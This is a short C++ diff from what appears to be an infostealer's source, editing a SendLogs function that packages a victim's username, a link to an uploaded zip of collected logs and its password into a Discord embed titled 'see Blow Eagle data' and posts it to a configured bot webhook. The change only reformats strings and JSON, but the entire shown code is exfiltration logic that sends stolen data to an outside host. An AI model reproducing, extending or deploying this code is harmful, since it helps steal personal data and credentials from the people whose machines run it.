@@ -38,12 +38,19 @@ void manager::SendLogs(std::string zipName,std::string zipPwd)
 	std::cout << url << std::endl;
 	std::cout << zipPwd << std::endl;
 	
-	std::string title = "!!!hey bro, see Blow Eagle data!!!";
-	std::string content = " 👤User: "+func::GetUser() + " 🔗Link: " + url + " 🔑Password: " + zipPwd;
+    std::string title = "!!!hey bro, see Blow Eagle data!!!";
+    std::string content = "\\n👤User: " + func::GetUser() + "\\n🔗Link: " + url + "\\n🔑Password: " + zipPwd;
 
-	std::cout << url;
+    //std::cout << url;
 
-	std::string data = "{\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + content + "\",\"color\": 10181046}]}";
+    std::string data = R"({
+        "content": null,
+        "embeds": [{
+            "title": ")" + title + R"(",
+            "description": ")" + content + R"(",
+            "color": 10181046
+        }]
+    })";
 
 	func::sendDiscordWebhook(config::Bot_url.c_str(), data.c_str());
 }
